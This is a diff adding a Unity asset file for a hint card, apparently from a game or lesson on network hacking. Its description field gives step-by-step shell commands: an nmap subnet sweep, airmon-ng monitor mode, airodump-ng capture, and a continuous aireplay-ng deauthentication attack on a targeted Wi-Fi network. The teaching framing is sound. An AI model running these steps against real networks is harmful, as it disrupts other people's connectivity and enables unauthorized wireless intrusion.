@@ -1,0 +1,35 @@
+%YAML 1.1
+%TAG !u! tag:unity3d.com,2011:
+--- !u!114 &11400000
+MonoBehaviour:
+  m_ObjectHideFlags: 0
+  m_CorrespondingSourceObject: {fileID: 0}
+  m_PrefabInstance: {fileID: 0}
+  m_PrefabAsset: {fileID: 0}
+  m_GameObject: {fileID: 0}
+  m_Enabled: 1
+  m_EditorHideFlags: 0
+  m_Script: {fileID: 11500000, guid: f007193b616daaf499450919c036edb7, type: 3}
+  m_Name: 11_Hint_NetScan
+  m_EditorClassIdentifier: 
+  titleHint: 
+  imageHint: {fileID: 0}
+  descHint: '1. nmap -sn 192.168.43.0/24
+
+    2. iwconfig
+
+    3. airmon-ng start
+    [interface]
+
+    4. iwconfig
+
+    5. airodump-ng [interface]
+
+    6. airodump-ng
+    --bssid [bssid wifi ke satu] --channel [channel wifi ke satu] [interface]
+
+    7.
+    aireplay-ng --deauth 0 -a [bssid wifi ke satu] [interface]
+
+    8. airmon-ng
+    stop [interface]'
